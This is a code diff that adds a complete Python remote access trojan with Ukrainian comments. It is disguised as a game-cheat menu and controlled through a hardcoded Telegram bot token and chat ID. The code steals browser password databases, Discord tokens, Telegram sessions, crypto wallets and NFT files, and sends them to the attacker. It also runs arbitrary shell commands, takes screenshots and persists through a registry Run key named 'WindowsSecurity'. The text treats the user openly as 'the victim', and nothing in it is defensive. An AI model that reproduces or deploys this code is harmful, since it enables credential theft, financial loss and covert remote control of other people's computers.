@@ -1,0 +1,401 @@
+import os
+import sys
+import subprocess
+import threading
+import time
+import urllib.request
+import urllib.parse
+import json
+import ctypes
+import shutil
+import tkinter as tk
+from tkinter import messagebox
+
+# ================== НАЛАШТУВАННЯ ==================
+TOKEN = "8552043299:AAHh4-QPU5i9fTuhX9DHblhY6o8Rx2lfEpc"  # твій токен бота
+CHAT_ID = "5528192482"                                      # твій chat_id
+# ===================================================
+
+# Приховати консольне вікно (Windows)
+if sys.platform == "win32":
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ---------- Функції для роботи з Telegram ----------
+def send_message(text):
+    """Надіслати текстове повідомлення в Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        data = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': text[:4000]}).encode()
+        urllib.request.urlopen(url, data=data)
+    except Exception:
+        pass
+
+def send_file(file_path):
+    """Надіслати файл в Telegram"""
+    try:
+        with open(file_path, 'rb') as f:
+            boundary = '----WebKitFormBoundary' + str(time.time()).replace('.', '')
+            body = []
+            body.append(f'--{boundary}\r\n'.encode())
+            body.append(f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'.encode())
+            body.append(f'--{boundary}\r\n'.encode())
+            body.append(f'Content-Disposition: form-data; name="document"; filename="{os.path.basename(file_path)}"\r\n'.encode())
+            body.append(b'Content-Type: application/octet-stream\r\n\r\n')
+            body.append(f.read())
+            body.append(f'\r\n--{boundary}--\r\n'.encode())
+            req = urllib.request.Request(f"https://api.telegram.org/bot{TOKEN}/sendDocument", data=b''.join(body))
+            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+            urllib.request.urlopen(req)
+    except Exception:
+        pass
+
+def screenshot():
+    """Зробити скріншот екрана і відправити"""
+    try:
+        from PIL import ImageGrab
+        img = ImageGrab.grab()
+        img.save('screen.png')
+        send_file('screen.png')
+        os.remove('screen.png')
+    except Exception:
+        send_message("❌ Не вдалося зробити скріншот. Встановіть Pillow: pip install pillow")
+
+# ---------- Функції крадіжки даних ----------
+def steal_browser_passwords():
+    """Копіює бази паролів з браузерів"""
+    sent = 0
+    paths = {
+        'chrome': os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
+        'edge': os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
+        'opera': os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Login Data")
+    }
+    for name, path in paths.items():
+        if os.path.exists(path):
+            try:
+                shutil.copy2(path, f'{name}_login.db')
+                send_file(f'{name}_login.db')
+                os.remove(f'{name}_login.db')
+                sent += 1
+            except Exception:
+                pass
+    if sent > 0:
+        send_message(f"✅ Надіслано {sent} файлів з паролями браузерів")
+    else:
+        send_message("❌ Паролі браузерів не знайдено")
+
+def steal_discord_tokens():
+    """Пошук токенів Discord у локальних файлах"""
+    tokens = []
+    paths = [
+        os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
+        os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb"),
+        os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb")
+    ]
+    for path in paths:
+        if not os.path.exists(path):
+            continue
+        for file in os.listdir(path):
+            if not (file.endswith('.ldb') or file.endswith('.log')):
+                continue
+            try:
+                with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                    data = f.read()
+                    # регулярний вираз для пошуку токенів Discord
+                    import re
+                    found = re.findall(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}', data)
+                    tokens.extend(found)
+            except Exception:
+                pass
+    if tokens:
+        unique = list(set(tokens))
+        with open('discord_tokens.txt', 'w') as f:
+            f.write('\n'.join(unique))
+        send_file('discord_tokens.txt')
+        os.remove('discord_tokens.txt')
+        send_message(f"✅ Знайдено {len(unique)} токенів Discord")
+    else:
+        send_message("❌ Токени Discord не знайдено")
+
+def steal_telegram_session():
+    """Архівує папку з сесією Telegram"""
+    tdata_path = os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Telegram Desktop\tdata")
+    if not os.path.exists(tdata_path):
+        send_message("❌ Telegram не знайдено")
+        return
+    try:
+        import zipfile
+        zip_name = 'telegram_session.zip'
+        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as z:
+            for root, _, files in os.walk(tdata_path):
+                for file in files:
+                    full_path = os.path.join(root, file)
+                    arcname = os.path.relpath(full_path, tdata_path)
+                    z.write(full_path, arcname)
+        send_file(zip_name)
+        os.remove(zip_name)
+        send_message("✅ Сесія Telegram успішно вкрадена")
+    except Exception as e:
+        send_message(f"❌ Помилка при крадіжці Telegram: {e}")
+
+def steal_crypto_wallets():
+    """Пошук крипто-гаманців (Bitcoin, Ethereum, MetaMask)"""
+    wallet_paths = [
+        os.path.expandvars(r"%APPDATA%\Bitcoin\wallets"),
+        os.path.expandvars(r"%APPDATA%\Ethereum\keystore"),
+        os.path.expandvars(r"%APPDATA%\MetaMask\Local Storage\leveldb")
+    ]
+    found = 0
+    for path in wallet_paths:
+        if not os.path.exists(path):
+            continue
+        if os.path.isfile(path):
+            send_file(path)
+            found += 1
+        else:
+            # запакувати папку
+            try:
+                import zipfile
+                zip_name = f'wallet_{os.path.basename(path)}.zip'
+                with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as z:
+                    for root, _, files in os.walk(path):
+                        for file in files[:10]:  # обмеження 10 файлів
+                            full_path = os.path.join(root, file)
+                            arcname = os.path.relpath(full_path, path)
+                            z.write(full_path, arcname)
+                send_file(zip_name)
+                os.remove(zip_name)
+                found += 1
+            except Exception:
+                pass
+    if found:
+        send_message(f"✅ Надіслано {found} крипто-гаманців")
+    else:
+        send_message("❌ Крипто-гаманці не знайдено")
+
+def steal_nft_files():
+    """Пошук файлів, схожих на NFT (зображення, відео, json)"""
+    search_folders = [
+        os.path.expandvars(r"%USERPROFILE%\Downloads"),
+        os.path.expandvars(r"%USERPROFILE%\Desktop"),
+        os.path.expandvars(r"%USERPROFILE%\Pictures")
+    ]
+    extensions = ('.png', '.jpg', '.jpeg', '.gif', '.mp4', '.json')
+    nft_files = []
+    for folder in search_folders:
+        if not os.path.exists(folder):
+            continue
+        for file in os.listdir(folder):
+            if not file.lower().endswith(extensions):
+                continue
+            # перевіряємо наявність ключових слів
+            if 'nft' in file.lower() or 'crypto' in file.lower() or 'opensea' in file.lower():
+                nft_files.append(os.path.join(folder, file))
+    if nft_files:
+        try:
+            import zipfile
+            zip_name = 'nft_files.zip'
+            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as z:
+                for f in nft_files[:20]:  # обмеження 20 файлів
+                    z.write(f, os.path.basename(f))
+            send_file(zip_name)
+            os.remove(zip_name)
+            send_message(f"✅ Знайдено {len(nft_files)} NFT-файлів (надіслано {min(20, len(nft_files))})")
+        except Exception:
+            send_message("❌ Помилка при створенні архіву NFT")
+    else:
+        send_message("❌ NFT-файли не знайдено")
+
+def steal_all():
+    """Виконує всі функції крадіжки"""
+    send_message("🔄 Починаю тотальну крадіжку даних...")
+    steal_browser_passwords()
+    steal_discord_tokens()
+    steal_telegram_session()
+    steal_crypto_wallets()
+    steal_nft_files()
+    send_message("✅ Крадіжка завершена")
+
+# ---------- Функція обробки команд з Telegram ----------
+def process_commands():
+    """Постійно перевіряє нові повідомлення в боті та виконує команди"""
+    offset = 0
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}&timeout=10"
+            with urllib.request.urlopen(url) as resp:
+                data = json.loads(resp.read().decode())
+            for update in data['result']:
+                offset = update['update_id'] + 1
+                if 'message' in update and 'text' in update['message']:
+                    text = update['message']['text'].strip()
+
+                    # ========== КОМАНДИ ==========
+                    if text == '/start' or text == '/help':
+                        help_text = """
+🔰 ДОСТУПНІ КОМАНДИ:
+
+🖥️ КЕРУВАННЯ:
+/screen - скріншот екрана
+/msg текст - показати вікно з повідомленням
+/cmd команда - виконати команду в CMD
+/open програма - відкрити програму (calc, notepad...)
+/close процес - закрити процес (notepad, chrome...)
+/play шлях - програти WAV-файл
+/list - список запущених процесів
+/get шлях - отримати файл з комп'ютера
+/dir шлях - список файлів у папці
+
+💰 КРАДІЖКА:
+/steal_pass - паролі браузерів
+/steal_discord - токени Discord
+/steal_telegram - сесія Telegram
+/steal_wallets - крипто-гаманці
+/steal_nft - NFT файли
+/steal_all - все одразу
+                        """
+                        send_message(help_text)
+
+                    elif text.startswith('/cmd '):
+                        command = text[5:]
+                        try:
+                            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+                            output = f"OUT:\n{result.stdout}\nERR:\n{result.stderr}"
+                            send_message(output[:4000])
+                        except Exception as e:
+                            send_message(f"❌ Помилка: {e}")
+
+                    elif text.startswith('/msg '):
+                        msg = text[5:]
+                        threading.Thread(target=lambda: messagebox.showinfo("Повідомлення", msg)).start()
+                        send_message("✅ Повідомлення відправлено")
+
+                    elif text == '/screen':
+                        screenshot()
+
+                    elif text.startswith('/open '):
+                        program = text[6:]
+                        try:
+                            subprocess.Popen(program, shell=True)
+                            send_message(f"✅ Відкрито: {program}")
+                        except Exception as e:
+                            send_message(f"❌ Помилка: {e}")
+
+                    elif text.startswith('/close '):
+                        process_name = text[7:]
+                        os.system(f"taskkill /f /im {process_name}.exe >nul 2>&1")
+                        send_message(f"✅ Процес {process_name} закрито")
+
+                    elif text.startswith('/play '):
+                        path = text[6:]
+                        try:
+                            import winsound
+                            winsound.PlaySound(path, winsound.SND_FILENAME)
+                            send_message(f"🎵 Відтворюється: {path}")
+                        except Exception:
+                            send_message("❌ Не вдалося відтворити (підтримуються тільки WAV)")
+
+                    elif text == '/list':
+                        result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
+                        send_message(result.stdout[:4000])
+
+                    elif text.startswith('/get '):
+                        path = text[5:]
+                        if os.path.exists(path):
+                            send_file(path)
+                        else:
+                            send_message("❌ Файл не знайдено")
+
+                    elif text.startswith('/dir '):
+                        path = text[5:]
+                        if os.path.exists(path) and os.path.isdir(path):
+                            files = os.listdir(path)[:50]  # перші 50
+                            send_message('\n'.join(files))
+                        else:
+                            send_message("❌ Папку не знайдено")
+
+                    elif text == '/steal_pass':
+                        steal_browser_passwords()
+                    elif text == '/steal_discord':
+                        steal_discord_tokens()
+                    elif text == '/steal_telegram':
+                        steal_telegram_session()
+                    elif text == '/steal_wallets':
+                        steal_crypto_wallets()
+                    elif text == '/steal_nft':
+                        steal_nft_files()
+                    elif text == '/steal_all':
+                        steal_all()
+        except Exception:
+            pass
+        time.sleep(1)
+
+# ---------- Автозапуск ----------
+def add_to_startup():
+    """Додає програму в автозапуск через реєстр"""
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Run",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WindowsSecurity", 0, winreg.REG_SZ,
+                          sys.executable + ' "' + __file__ + '"')
+        winreg.CloseKey(key)
+    except Exception:
+        pass
+
+# ---------- Фейкове меню "чіта" ----------
+class FakeCheatGUI:
+    """Вікно, яке маскує RAT під гру з читами"""
+    def __init__(self):
+        self.root = tk.Tk()
+        self.root.title("⚡ MEGA CHEAT v9.9 ⚡")
+        self.root.geometry("500x450")
+        self.root.configure(bg='#0a0a0a')
+        self.root.resizable(False, False)
+
+        tk.Label(self.root,
+                 text="🔴 ПРЕМІУМ ЧІТ АКТИВОВАНО 🔴",
+                 font=("Arial", 18, "bold"),
+                 fg="#00ff00",
+                 bg="#0a0a0a").pack(pady=20)
+
+        buttons = [
+            ("🎯 AIMBOT (100%)", "#1e1e1e"),
+            ("👁️ WALLHACK + ESP", "#1e1e1e"),
+            ("⚡ SPEED HACK", "#1e1e1e"),
+            ("📦 FLY HACK", "#1e1e1e"),
+            ("💰 AUTO FARM", "#1e1e1e"),
+        ]
+        for text, color in buttons:
+            tk.Button(self.root,
+                      text=text,
+                      font=("Arial", 14),
+                      width=30,
+                      height=2,
+                      bg=color,
+                      fg="#00ff00",
+                      command=self.button_click).pack(pady=5)
+
+        tk.Label(self.root,
+                 text="✅ Статус: Підключено до сервера",
+                 fg="#00ff00",
+                 bg="#0a0a0a").pack(pady=10)
+        tk.Label(self.root,
+                 text="⚙️ Версія: 9.9.9 | Ліцензія: PREMIUM",
+                 fg="#666666",
+                 bg="#0a0a0a").pack()
+
+        send_message("🚀 Жертва запустила 'чіт'")
+        self.root.mainloop()
+
+    def button_click(self):
+        send_message("👆 Жертва натиснула кнопку в меню чита")
+
+# ================== ГОЛОВНИЙ ЗАПУСК ==================
+if __name__ == "__main__":
+    add_to_startup()                     # додаємо в автозапуск
+    send_message("✅ RAT успішно запущено на комп'ютері жертви")
+    # Запускаємо обробку команд у фоновому потоці
+    threading.Thread(target=process_commands, daemon=True).start()
+    # Показуємо фейкове меню
+    FakeCheatGUI()
